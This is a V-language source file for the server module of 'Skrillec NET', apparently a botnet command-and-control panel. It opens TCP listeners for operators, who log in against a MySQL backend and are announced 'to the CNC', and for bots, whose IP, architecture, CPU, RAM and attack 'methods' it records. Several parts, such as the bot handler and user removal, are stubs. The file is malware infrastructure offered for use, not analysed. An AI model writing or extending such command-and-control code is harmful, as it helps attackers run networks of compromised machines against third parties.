module server

import os
import io
import net
import time
import auth
import utils
import mysql
import config
import server
import net.http
import rand

/* 
Server Struct and Server Functions
*/
pub struct Server {
	pub mut:
		port 			string
		bot_port		string
		cnc_key 		string
		bot_encryption	string
		clients			&Clients
		bots 			&Bots
		current			&server.Current
		notice			&utils.NotificationSys
		parser			&utils.Parse
		sqlconn			mysql.Connection
}

/*
Clients struct being called from Server Struct. Do not call this struct anywhere in this source
*/
pub struct Clients {
	pub mut:
		user_count		int
		u_name			[]string
		u_sockets		[]net.TcpConn
		u_ip			[]string
		u_port			[]int
		using_client	[]bool
}

/*
Bots struct being called from Server Struct. Do not call this struct anywhere in this source!
*/
pub struct Bots { 
	pub mut:
		bot_count		int
		bot_name		[]string
		bot_sockets		[]net.TcpConn
		bot_ip			[]string
		bot_port		[]string
		bot_arch		[]string
		bot_cpu			[]string
		bot_ram			[]string
		bot_methods		[]string
}

pub fn (mut s Server) set_port(port string) {
	s.port = port
}

pub fn (mut s Server) set_bot_port(port string) {
	s.bot_port = port
}

pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: socket)
	mut user_ip := socket.peer_addr() or { return }
	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
	mut fixed_port := "$user_ip".split("]:")[1]
	mut cursor_p := utils.parse((os.read_file(os.getwd() + "/assets/config.skrillec") or { "" }), "Hostname", "cli_cursor").split(",")

	utils.change_title(mut socket, "Official Skrillec NET | Under **Development**")
	print("New User Connected!: ${fixed_ip}:${fixed_port}\r\n")
	mut start_current := server.Current{}
	//Add captcha here to avoid bot logins or other things
    /*
		Captcha shi there
	*/
    // server.captcha(mut socket)
	//Add login here then log the user's username, IP, and detect if user is using the Skrillec CLIENT to connect
	/*
		Login shit here
	*/
	utils.output_login(mut socket)
	utils.move_cursor(mut socket, 10, 18)
	mut uname := reader.read_line() or { "" }
	utils.move_cursor(mut socket, 13, 18)
	socket.write_string("${config.Black}") or { 0 } // Black text when typing password (invisible)
	mut pwd := reader.read_line() or { "" }
	socket.write_string(config.Default) or { 0 } // reset color to default
	print("New User has logged in! ${uname}\r\n")
	login_check := auth.login(mut &s.sqlconn, mut socket, auth.CurrentLogin{
		username: uname
		password: pwd
		ip: fixed_ip
	})
	s.clients.new_user(uname, mut socket, fixed_ip, fixed_port.int(), false)
	///////////////////////////////// Send to command handler after login! ///////////////////////////////////////////
	for i in 0..(s.clients.u_name).len {
		if s.clients.u_name[i] != uname {
			s.clients.u_sockets[i].write_string("\r\n[+] New user has joined the CNC! ${uname}\r\n") or { 0 }
		}
	}
	utils.output_ui(mut socket, "")
	time.sleep(300*time.millisecond)
	utils.place_text(mut socket, cursor_p[0].int(), cursor_p[1].int(), "")
	server.cmd_handler(mut socket, mut &s, mut &start_current)
}

////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////

pub fn start_skrillec(mut s Server) {
	mut svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
	for {
		mut socket := svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
		socket.set_read_timeout(time.infinite)
		go s.connection_handler(mut socket)
	}
}

/*
	Struct User Lookup Functions
*/

pub fn (mut c Clients) new_user(uname string, mut socket net.TcpConn, ip string, port int, using_client bool) {
	c.user_count += 1
	c.u_name << uname
	c.u_sockets << socket
	c.u_ip << ip
	c.u_port << port
	c.using_client << using_client
}

pub fn (mut c Clients) remove_user(uname string) {
	
}

pub fn (mut c Clients) get_ip(username string) string {
	for i in 0..(c.u_sockets).len {
		if c.u_name[i] == username {
			ip := c.u_sockets[i].peer_addr() or { panic("[x] Error") }
			return "$ip"
		}
	}
	return ""
}

pub fn (mut c Clients) get_username(mut socket net.TcpConn) string {
	for i in 0..(c.u_sockets).len {
		if c.u_sockets[i] == socket {
			ip := c.u_name[i]
			return "$ip"
		}
	}
	return ""
}

/*****************************************************************************************************
*
*								BOT FUNCTIONS
*
*****************************************************************************************************/
pub fn start_skrillec_bot(mut svr server.Server) {
	mut bot_svr := net.listen_tcp(.ip6, ":${svr.bot_port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
	for {
		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
		bot_socket.set_read_timeout(time.infinite)
		go svr.bots.bot_conn_handler(mut bot_socket, mut &svr)
	}
}

pub fn (mut b Bots) bot_conn_handler(mut bot_socket net.TcpConn, mut svr server.Server) {
	mut user_ip := bot_socket.peer_addr() or { return }
	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
	mut fixed_port := "$user_ip".split("]:")[1]
}
